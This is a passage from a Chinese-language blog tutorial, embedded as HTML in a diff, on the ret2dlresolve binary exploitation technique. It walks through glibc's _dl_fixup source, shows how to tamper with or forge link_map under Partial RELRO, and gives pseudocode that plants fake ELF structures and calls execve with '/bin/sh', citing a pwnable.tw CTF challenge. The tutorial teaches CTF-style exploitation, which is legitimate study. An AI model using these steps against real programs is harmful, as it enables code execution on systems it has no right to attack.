+<span id="cb14-22"><a href="#cb14-22" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>__builtin_expect <span class="op">(</span>ELFW<span class="op">(</span>ST_VISIBILITY<span class="op">)</span> <span class="op">(</span>sym<span class="op">-&gt;</span>st_other<span class="op">),</span> <span class="dv">0</span><span class="op">)</span> <span class="op">==</span> <span class="dv">0</span><span class="op">)</span></span>
+<span id="cb14-23"><a href="#cb14-23" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
+<span id="cb14-24"><a href="#cb14-24" aria-hidden="true" tabindex="-1"></a>          <span class="dt">const</span> <span class="kw">struct</span> r_found_version <span class="op">*</span>version <span class="op">=</span> NULL<span class="op">;</span></span>
+<span id="cb14-25"><a href="#cb14-25" aria-hidden="true" tabindex="-1"></a>        <span class="co">// 获取符号的版本信息                                                               </span></span>
+<span id="cb14-26"><a href="#cb14-26" aria-hidden="true" tabindex="-1"></a>        <span class="dt">const</span> <span class="kw">struct</span> r_found_version <span class="op">*</span>version <span class="op">=</span> NULL<span class="op">;</span>                                       </span>
+<span id="cb14-27"><a href="#cb14-27" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>l<span class="op">-&gt;</span>l_info<span class="op">[</span>VERSYMIDX<span class="op">(</span>DT_VERSYM<span class="op">)]</span> <span class="op">!=</span> NULL<span class="op">)</span> <span class="co">//避免进入该if分支    </span></span>
+<span id="cb14-28"><a href="#cb14-28" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span>                                                                                   </span>
+<span id="cb14-29"><a href="#cb14-29" aria-hidden="true" tabindex="-1"></a>            <span class="dt">const</span> ElfW<span class="op">(</span>Half<span class="op">)</span> <span class="op">*</span>vernum <span class="op">=</span> <span class="op">(</span><span class="dt">const</span> <span class="dt">void</span> <span class="op">*)</span>D_PTR<span class="op">(</span>l<span class="op">,</span>l_info<span class="op">[</span>VERSYMIDX<span class="op">(</span>DT_VERSYM<span class="op">)]);</span></span>
+<span id="cb14-30"><a href="#cb14-30" aria-hidden="true" tabindex="-1"></a>            ElfW<span class="op">(</span>Half<span class="op">)</span> ndx <span class="op">=</span> vernum<span class="op">[</span>ELFW<span class="op">(</span>R_SYM<span class="op">)(</span>reloc<span class="op">-&gt;</span>r_info<span class="op">)]</span> <span class="op">&amp;</span> <span class="bn">0x7fff</span><span class="op">;</span>    <span class="co">//获取r_info中的index               </span></span>
+<span id="cb14-31"><a href="#cb14-31" aria-hidden="true" tabindex="-1"></a>            version <span class="op">=</span> <span class="op">&amp;</span>l<span class="op">-&gt;</span>l_versions<span class="op">[</span>ndx<span class="op">];</span> <span class="co">//由于我们伪造的index过大，导致l_versions数组内存不可访问，程序崩溃                                       </span></span>
+<span id="cb14-32"><a href="#cb14-32" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>version<span class="op">-&gt;</span>hash <span class="op">==</span> <span class="dv">0</span><span class="op">)</span>                                             </span>
+<span id="cb14-33"><a href="#cb14-33" aria-hidden="true" tabindex="-1"></a>                version <span class="op">=</span> NULL<span class="op">;</span>                                                 </span>
+<span id="cb14-34"><a href="#cb14-34" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> </span>
+<span id="cb14-35"><a href="#cb14-35" aria-hidden="true" tabindex="-1"></a>        <span class="co">//......</span></span>
+<span id="cb14-36"><a href="#cb14-36" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> <span class="cf">else</span><span class="op">{</span></span>
+<span id="cb14-37"><a href="#cb14-37" aria-hidden="true" tabindex="-1"></a>      <span class="co">/* We already found the symbol.  The module (and therefore its load</span></span>
+<span id="cb14-38"><a href="#cb14-38" aria-hidden="true" tabindex="-1"></a><span class="co">     address) is also known.  */</span></span>
+<span id="cb14-39"><a href="#cb14-39" aria-hidden="true" tabindex="-1"></a>      value <span class="op">=</span> DL_FIXUP_MAKE_VALUE <span class="op">(</span>l<span class="op">,</span> l<span class="op">-&gt;</span>l_addr <span class="op">+</span> sym<span class="op">-&gt;</span>st_value<span class="op">);</span></span>
+<span id="cb14-40"><a href="#cb14-40" aria-hidden="true" tabindex="-1"></a>      result <span class="op">=</span> l<span class="op">;</span></span>
+<span id="cb14-41"><a href="#cb14-41" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb14-42"><a href="#cb14-42" aria-hidden="true" tabindex="-1"></a>    <span class="co">//......</span></span>
+<span id="cb14-43"><a href="#cb14-43" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<h4 id="修改link_map">2.2 修改link_map</h4>
+<p>#####2.2.1 分析</p>
+<p>至此，通过阅读源码我们知道，保存在<code>ld.so</code>数据段内存中的<code>linkmap-&gt;l_info</code>是寻找函数的关键，它是一个存储动态指针的链表，如<code>l_info[DT_STRTAB]</code>、<code>l_info[DT_JMPREL]</code>、<code>l_info[DT_SYMTAB]</code>等每个元素都是指向<code>Elfxx_Dyn</code>结构体的指针，它们一般情况下指向<code>elf</code>中<code>dynamic</code>段中的各项<code>Elfxx_Dyn</code>条目。</p>
+<p>于是我们可以修改<code>linkmap-&gt;l_info[DT_STRTAB]</code>到我们的可控区域，然后伪造<code>Elf_Dyn</code>条目和函数字符串即可，即我们回到了第1节所述情况，而不需要伪造多个条目，计算多个偏移了。</p>
+<p>值得注意的是，在x64的情况下，该方法的限制与2.1节伪造所有条目的方法一致，都需要任意读写才能完成，因为我们需要控制<code>&amp;link_map+0x1c8</code>为<code>NULL</code>，否则我们绕不开该条语句的判断，程序仍然会崩溃。</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>__builtin_expect<span class="op">(</span>ELFW<span class="op">(</span>ST_VISIBILITY<span class="op">)(</span>sym<span class="op">-&gt;</span>st_other<span class="op">),</span> <span class="dv">0</span><span class="op">)</span> <span class="op">==</span> <span class="dv">0</span><span class="op">)</span></span></code></pre></div>
+<h5 id="利用-1">2.2.2 利用</h5>
+<p>不过此小节的方法思路较为简单，手动构造也十分容易，只是需要的利用条件是一样的。</p>
+<figure>
+<img src="/2022/03/05/Ret2dlresolve——从No-RELRO到FULL-RELRO/ret2dlresolve--4.Partial-RELRO.1.png" alt="ret2dlresolve--4.Partial-RELRO.1">
+<figcaption aria-hidden="true">ret2dlresolve--4.Partial-RELRO.1</figcaption>
+</figure>
+<p>看一下利用伪代码吧：</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="co">&quot;&quot;&quot;</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="co">func_strtab_offset = 借用的正常函数的函数字符串在.dynstr表中的偏移</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="co">func_plt = 借用的正常函数的plt地址（地址需要包含push linkmap;push offset代码段）</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="co">&quot;&quot;&quot;</span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>DT_STRTAB <span class="op">=</span> <span class="dv">5</span></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 64位的结构体为例</span></span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>fake_Elf_Dyn_entry <span class="op">=</span> p64(DT_STRTAB) <span class="op">+</span> p64(writeable_addr <span class="op">+</span> <span class="bn">0x10</span> <span class="op">-</span> func_strtab_offset)</span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a>fake_entries  <span class="op">=</span> fake_Elf_Dyn_entry</span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a>fake_entries <span class="op">+=</span> <span class="st">b&quot;execve</span><span class="ch">\x00</span><span class="st">&quot;</span></span>
+<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a><span class="co"># 向可控内存写入伪造的结构体</span></span>
+<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a>your_write(writable_addr, fake_entries)</span>
+<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a><span class="co"># 如果是x64位，则需要额外控制一处内存</span></span>
+<span id="cb16-16"><a href="#cb16-16" aria-hidden="true" tabindex="-1"></a>your_write(<span class="op">&amp;</span>link_map <span class="op">+</span> <span class="bn">0x1c8</span>, <span class="st">b&quot;</span><span class="ch">\x00</span><span class="st">&quot;</span><span class="op">*</span><span class="dv">8</span>) <span class="co"># 高版本libc偏移为0x1d0</span></span>
+<span id="cb16-17"><a href="#cb16-17" aria-hidden="true" tabindex="-1"></a><span class="co">#手动传递execve的参数</span></span>
+<span id="cb16-18"><a href="#cb16-18" aria-hidden="true" tabindex="-1"></a>pass_args(<span class="st">b&quot;/bin/sh</span><span class="ch">\x00</span><span class="st">&quot;</span>, <span class="dv">0</span> ,<span class="dv">0</span>) </span>
+<span id="cb16-19"><a href="#cb16-19" aria-hidden="true" tabindex="-1"></a><span class="co"># 调用 _dl_runtime_resolve</span></span>
+<span id="cb16-20"><a href="#cb16-20" aria-hidden="true" tabindex="-1"></a><span class="co"># 此时因为是借用，所以我们可以直接跳到借用函数的plt即可</span></span>
+<span id="cb16-21"><a href="#cb16-21" aria-hidden="true" tabindex="-1"></a>jmp(func_plt)</span>
+<span id="cb16-22"><a href="#cb16-22" aria-hidden="true" tabindex="-1"></a><span class="co"># 或者手动构造函数调用_dl_runtime_resolve，此时的offset是对应函数的offet(32bit)或者说是index(64bit)</span></span>
+<span id="cb16-23"><a href="#cb16-23" aria-hidden="true" tabindex="-1"></a>_dl_runtime_resolve(<span class="op">&amp;</span>link_map, offset)</span></code></pre></div>
+<h5 id="小结-2">2.2.3 小结</h5>
+<p>此方法构造数据结构简单，可以快速地手动构造，需要记忆的点非常少，所需要的可控区域也很小（32bit下16B，64位下24B），只需要将<code>ld.so</code>中的<code>link_map</code>中的<code>l_info[STRTAB]</code>改掉即可，同样需要任意读写的能力。</p>
+<p>该方法是我在<code>partial RELRO</code>下使用<code>ret2dlresolve</code>攻击的常用方法，也十分建议读者们使用。</p>
+<h4 id="难度更升一级无输出函数情况伪造linkmap">2.3
+难度更升一级：无输出函数情况——伪造linkmap</h4>
+<h5 id="分析">2.3.1 分析</h5>
+<p>我们假设一种64位下比较极端的情况——没有任何输出函数可以泄露出<code>link_map</code>的地址，则我们就无法修改<code>l_info[VERSYMIDX(DT_VERSYM)]</code>为<code>NULL</code>，那么我们就无法绕开的<code>l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != NULL</code>，即程序因访问到非法区域而崩溃。（32位则不需要考虑是否会崩溃，可直接使用2,1节的方式进行攻击）</p>
+<p>此时我们需要<strong>一种不需要输出函数也能攻击的方法</strong>。（相关问题出现在这道CTF题上<a href="https://pwnable.tw/challenge/" target="_blank" rel="noopener">pwnable.tw unexploitable</a>）</p>
+<p><strong>我们如果说上一小节的2.1.4中的4小节是绕过小判断，则这次我们需要绕过更上一层的判断</strong>，即使得
+<code>if (__builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), 0) == 0)</code>不成立，走进else分支。</p>
+<p>我们来看看<code>_dl_fixup()</code>中这段源码：</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co">//  source/elf/dl-runtime.c</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="co">/* Construct a value of type DL_FIXUP_VALUE_TYPE from a code address</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="co">   and a link map.  */</span>                                              </span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DL_FIXUP_MAKE_VALUE(map, addr) (addr)  </span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>_dl_fixup<span class="op">(){</span></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ......</span></span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a>    <span class="co">/* Look up the target symbol.  If the normal lookup rules are not                       </span></span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a><span class="co">      used don&#39;t look in the global scope.  */</span>                                              </span>
+<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 判断符号的可见性                                                                    </span></span>
+<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>__builtin_expect<span class="op">(</span>ELFW<span class="op">(</span>ST_VISIBILITY<span class="op">)(</span>sym<span class="op">-&gt;</span>st_other<span class="op">),</span> <span class="dv">0</span><span class="op">)</span> <span class="op">==</span> <span class="dv">0</span><span class="op">)</span> <span class="co">// 避免计入该分支！                      </span></span>
+<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span>                                                                                       </span>
+<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a>        <span class="co">// 获取符号的版本信息                                                              </span></span>
+<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a>        <span class="dt">const</span> <span class="kw">struct</span> r_found_version <span class="op">*</span>version <span class="op">=</span> NULL<span class="op">;</span>                                       </span>
+<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>l<span class="op">-&gt;</span>l_info<span class="op">[</span>VERSYMIDX<span class="op">(</span>DT_VERSYM<span class="op">)]</span> <span class="op">!=</span> NULL<span class="op">)</span>                                        </span>
+<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span>                                                                                   </span>
+<span id="cb17-16"><a href="#cb17-16" aria-hidden="true" tabindex="-1"></a>            <span class="dt">const</span> ElfW<span class="op">(</span>Half<span class="op">)</span> <span class="op">*</span>vernum <span class="op">=</span> <span class="op">(</span><span class="dt">const</span> <span class="dt">void</span> <span class="op">*)</span>D_PTR<span class="op">(</span>l<span class="op">,</span> l_info<span class="op">[</span>VERSYMIDX<span class="op">(</span>DT_VERSYM<span class="op">)]);</span></span>
+<span id="cb17-17"><a href="#cb17-17" aria-hidden="true" tabindex="-1"></a>            ElfW<span class="op">(</span>Half<span class="op">)</span> ndx <span class="op">=</span> vernum<span class="op">[</span>ELFW<span class="op">(</span>R_SYM<span class="op">)(</span>reloc<span class="op">-&gt;</span>r_info<span class="op">)]</span> <span class="op">&amp;</span> <span class="bn">0x7fff</span><span class="op">;</span>                   </span>
+<span id="cb17-18"><a href="#cb17-18" aria-hidden="true" tabindex="-1"></a>            version <span class="op">=</span> <span class="op">&amp;</span>l<span class="op">-&gt;</span>l_versions<span class="op">[</span>ndx<span class="op">];</span>                                                  </span>
+<span id="cb17-19"><a href="#cb17-19" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>version<span class="op">-&gt;</span>hash <span class="op">==</span> <span class="dv">0</span><span class="op">)</span>                                                         </span>
+<span id="cb17-20"><a href="#cb17-20" aria-hidden="true" tabindex="-1"></a>                version <span class="op">=</span> NULL<span class="op">;</span>                                                             </span>
+<span id="cb17-21"><a href="#cb17-21" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span>                                                                                   </span>
+<span id="cb17-22"><a href="#cb17-22" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* We need to keep the scope around so do some locking.  This is                    </span></span>
+<span id="cb17-23"><a href="#cb17-23" aria-hidden="true" tabindex="-1"></a><span class="co">         not necessary for objects which cannot be unloaded or when                         </span></span>
+<span id="cb17-24"><a href="#cb17-24" aria-hidden="true" tabindex="-1"></a><span class="co">         we are not using any threads (yet).  */</span>                                            </span>
+<span id="cb17-25"><a href="#cb17-25" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> flags <span class="op">=</span> DL_LOOKUP_ADD_DEPENDENCY<span class="op">;</span>                                               </span>
+<span id="cb17-26"><a href="#cb17-26" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(!</span>RTLD_SINGLE_THREAD_P<span class="op">)</span>                                                          </span>
+<span id="cb17-27"><a href="#cb17-27" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span>                                                                                   </span>
+<span id="cb17-28"><a href="#cb17-28" aria-hidden="true" tabindex="-1"></a>            THREAD_GSCOPE_SET_FLAG<span class="op">();</span>                                                       </span>
+<span id="cb17-29"><a href="#cb17-29" aria-hidden="true" tabindex="-1"></a>            flags <span class="op">|=</span> DL_LOOKUP_GSCOPE_LOCK<span class="op">;</span>                                                 </span>
+<span id="cb17-30"><a href="#cb17-30" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span>                                                                                   </span>
+<span id="cb17-31"><a href="#cb17-31" aria-hidden="true" tabindex="-1"></a><span class="pp">#ifdef RTLD_ENABLE_FOREIGN_CALL                                                             </span></span>
+<span id="cb17-32"><a href="#cb17-32" aria-hidden="true" tabindex="-1"></a>        RTLD_ENABLE_FOREIGN_CALL<span class="op">;</span>                                                           </span>
+<span id="cb17-33"><a href="#cb17-33" aria-hidden="true" tabindex="-1"></a><span class="pp">#endif                                                                                      </span></span>
+<span id="cb17-34"><a href="#cb17-34" aria-hidden="true" tabindex="-1"></a>        <span class="co">// 查询待解析符号所在的目标文件的 link_map                                         </span></span>
+<span id="cb17-35"><a href="#cb17-35" aria-hidden="true" tabindex="-1"></a>        result <span class="op">=</span> _dl_lookup_symbol_x<span class="op">(</span>strtab <span class="op">+</span> sym<span class="op">-&gt;</span>st_name<span class="op">,</span> l<span class="op">,</span> <span class="op">&amp;</span>sym<span class="op">,</span> l<span class="op">-&gt;</span>l_scope<span class="op">,</span>            </span>
+<span id="cb17-36"><a href="#cb17-36" aria-hidden="true" tabindex="-1"></a>                                     version<span class="op">,</span> ELF_RTYPE_CLASS_PLT<span class="op">,</span> flags<span class="op">,</span> NULL<span class="op">);</span>            </span>
+<span id="cb17-37"><a href="#cb17-37" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* We are done with the global scope.  */</span>                                           </span>
+<span id="cb17-38"><a href="#cb17-38" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(!</span>RTLD_SINGLE_THREAD_P<span class="op">)</span>                                                          </span>
+<span id="cb17-39"><a href="#cb17-39" aria-hidden="true" tabindex="-1"></a>            THREAD_GSCOPE_RESET_FLAG<span class="op">();</span>                                                     </span>
+<span id="cb17-40"><a href="#cb17-40" aria-hidden="true" tabindex="-1"></a><span class="pp">#ifdef RTLD_FINALIZE_FOREIGN_CALL                                                           </span></span>
+<span id="cb17-41"><a href="#cb17-41" aria-hidden="true" tabindex="-1"></a>        RTLD_FINALIZE_FOREIGN_CALL<span class="op">;</span>                                                         </span>
+<span id="cb17-42"><a href="#cb17-42" aria-hidden="true" tabindex="-1"></a><span class="pp">#endif                                                                                      </span></span>
+<span id="cb17-43"><a href="#cb17-43" aria-hidden="true" tabindex="-1"></a>                                                                                            </span>
+<span id="cb17-44"><a href="#cb17-44" aria-hidden="true" tabindex="-1"></a>     <span class="co">/* Currently result contains the base load address (or link map)                       </span></span>
+<span id="cb17-45"><a href="#cb17-45" aria-hidden="true" tabindex="-1"></a><span class="co">     of the object that defines sym.  Now add in the symbol                                 </span></span>
+<span id="cb17-46"><a href="#cb17-46" aria-hidden="true" tabindex="-1"></a><span class="co">     offset.  */</span>                                                                            </span>
+<span id="cb17-47"><a href="#cb17-47" aria-hidden="true" tabindex="-1"></a>         <span class="co">// 基于查询到的 link_map 计算符号的绝对地址: result-&gt;l_addr + sym-&gt;st_value       </span></span>
+<span id="cb17-48"><a href="#cb17-48" aria-hidden="true" tabindex="-1"></a>        <span class="co">// l_addr 为待解析函数所在文件的基地址                                             </span></span>
+<span id="cb17-49"><a href="#cb17-49" aria-hidden="true" tabindex="-1"></a>      value <span class="op">=</span> DL_FIXUP_MAKE_VALUE <span class="op">(</span>result<span class="op">,</span>                                                  </span>
+<span id="cb17-50"><a href="#cb17-50" aria-hidden="true" tabindex="-1"></a>                   sym <span class="op">?</span> <span class="op">(</span>LOOKUP_VALUE_ADDRESS <span class="op">(</span>result<span class="op">)</span>                                     </span>
+<span id="cb17-51"><a href="#cb17-51" aria-hidden="true" tabindex="-1"></a>                      <span class="op">+</span> sym<span class="op">-&gt;</span>st_value<span class="op">)</span> <span class="op">:</span> <span class="dv">0</span><span class="op">);</span>                                                </span>
+<span id="cb17-52"><a href="#cb17-52" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span>                                                                                       </span>
+<span id="cb17-53"><a href="#cb17-53" aria-hidden="true" tabindex="-1"></a>  <span class="cf">else</span><span class="co">//我们的目标是进入到else分支！                                                                                      </span></span>
+<span id="cb17-54"><a href="#cb17-54" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span>                                                                                       </span>
+<span id="cb17-55"><a href="#cb17-55" aria-hidden="true" tabindex="-1"></a>      <span class="co">/* We already found the symbol.  The module (and therefore its load                   </span></span>
+<span id="cb17-56"><a href="#cb17-56" aria-hidden="true" tabindex="-1"></a><span class="co">     address) is also known.  */</span>                                                            </span>
+<span id="cb17-57"><a href="#cb17-57" aria-hidden="true" tabindex="-1"></a>      value <span class="op">=</span> DL_FIXUP_MAKE_VALUE <span class="op">(</span>l<span class="op">,</span> l<span class="op">-&gt;</span>l_addr <span class="op">+</span> sym<span class="op">-&gt;</span>st_value<span class="op">);</span>                           </span>
+<span id="cb17-58"><a href="#cb17-58" aria-hidden="true" tabindex="-1"></a>      result <span class="op">=</span> l<span class="op">;</span>                                                                           </span>
+<span id="cb17-59"><a href="#cb17-59" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span>                 </span>
+<span id="cb17-60"><a href="#cb17-60" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ......   </span></span>
+<span id="cb17-61"><a href="#cb17-61" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>那么此时我们仅需要在构造<code>Elf_Sym</code>结构体时将<code>Elf_Sym-&gt;st_other</code>设置为非0即可绕开，进入else分支。</p>
+<p><code>Elf_Sym-&gt;st_other</code>定义如下，实际上设置为非0即可：</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>┌─┬──────────────────────────────────────────────────────────────────────────────────┐</span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>│<span class="dv">1</span>│<span class="co">/* How to extract and insert information held in the st_other field.  */</span>          │</span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>│<span class="dv">2</span>│#define ELF32_ST_VISIBILITY<span class="op">(</span>o<span class="op">)</span>        <span class="op">((</span>o<span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0x03</span><span class="op">)</span>                                │</span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a>│<span class="dv">3</span>│<span class="co">/* For ELF64 the definitions are the same.  */</span>                                    │</span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a>│<span class="dv">4</span>│#define ELF64_ST_VISIBILITY<span class="op">(</span>o<span class="op">)</span>        ELF32_ST_VISIBILITY <span class="op">(</span>o<span class="op">)</span>                     │</span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>│<span class="dv">5</span>│<span class="co">/* Symbol visibility specification encoded in the st_other field.  */</span>             │</span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a>│<span class="dv">6</span>│#define STV_DEFAULT        <span class="dv">0</span>                <span class="co">/* Default symbol visibility rules */</span> │</span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a>│<span class="dv">7</span>│#define STV_INTERNAL       <span class="dv">1</span>                <span class="co">/* Processor specific hidden class */</span> │</span>
+<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a>│<span class="dv">8</span>│#define STV_HIDDEN         <span class="dv">2</span>                <span class="co">/* Sym unavailable in other modules */</span>│</span>
+<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a>│<span class="dv">9</span>│#define STV_PROTECTED      <span class="dv">3</span>                <span class="co">/* Not preemptible, not exported */</span>   │</span>
+<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a>└─┴──────────────────────────────────────────────────────────────────────────────────┘</span></code></pre></div>
+<p>这两个分支的区别无非在于当前查询的符号知否是已知的</p>
+<ol type="1">
+<li>若不是已知的则找到待解析函数所在文件的<code>link_map</code>，然后取出<code>l_addr</code>再计算.</li>
+<li>若是已知的则直接拿<code>l</code>的<code>l_addr</code>进行计算。</li>
+</ol>
+<p>进入else分支之后，我们地址的计算方式变更为<code>value = l-&gt;l_addr + sym-&gt;st_value</code>。</p>
+<p>那么因为原来<code>libc</code>中的<code>link_map</code>地址未知，则该<code>link_map</code>的<code>l_addr</code>值我们没有办法改变，那么如果我们能“另起炉灶”，构造一个新的的<code>link_map</code>呢？</p>
+<p><strong>接下来的构造有些绕，希望读者可以仔细阅读</strong></p>
+<p>我们构造的<code>link_map</code>要使得其：</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a>l_addr <span class="op">=</span> RVA(func A) <span class="op">-</span> RVA(func B)</span></code></pre></div>
+<p>其中<code>func A</code>为我们想要解析的函数，如<code>system</code>，<code>execve</code>,<code>func B</code>为当前程序已经解析的函数，如<code>__libc_start_main</code>。</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>type <span class="op">=</span> <span class="kw">struct</span> <span class="op">{</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="co">/*    0      |     4 */</span>    Elf32_Word st_name<span class="op">;</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="co">/*    4      |     4 */</span>    Elf32_Addr st_value<span class="op">;</span></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="co">/*    8      |     4 */</span>    Elf32_Word st_size<span class="op">;</span></span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a><span class="co">/*   12      |     1 */</span>    <span class="dt">unsigned</span> <span class="dt">char</span> st_info<span class="op">;</span></span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="co">/*   13      |     1 */</span>    <span class="dt">unsigned</span> <span class="dt">char</span> st_other<span class="op">;</span></span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="co">/*   14      |     2 */</span>    Elf32_Section st_shndx<span class="op">;</span></span>
+<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a>                           <span class="co">/* total size (bytes):   16 */</span></span>
+<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span>Elf32_Sym<span class="op">;</span></span>
+<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span><span class="op">{</span></span>
+<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a><span class="co">/*    0      |     4 */</span>    Elf64_Word st_name<span class="op">;</span></span>
+<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a><span class="co">/*    4      |     1 */</span>    <span class="dt">unsigned</span> <span class="dt">char</span> st_info<span class="op">;</span></span>
+<span id="cb20-15"><a href="#cb20-15" aria-hidden="true" tabindex="-1"></a><span class="co">/*    5      |     1 */</span>    <span class="dt">unsigned</span> <span class="dt">char</span> st_other<span class="op">;</span></span>
+<span id="cb20-16"><a href="#cb20-16" aria-hidden="true" tabindex="-1"></a><span class="co">/*    6      |     2 */</span>    Elf64_Section st_shndx<span class="op">;</span></span>
+<span id="cb20-17"><a href="#cb20-17" aria-hidden="true" tabindex="-1"></a><span class="co">/*    8      |     8 */</span>    Elf64_Addr st_value<span class="op">;</span></span>
+<span id="cb20-18"><a href="#cb20-18" aria-hidden="true" tabindex="-1"></a><span class="co">/*   16      |     8 */</span>    Elf64_Xword st_size<span class="op">;</span></span>
+<span id="cb20-19"><a href="#cb20-19" aria-hidden="true" tabindex="-1"></a></span>
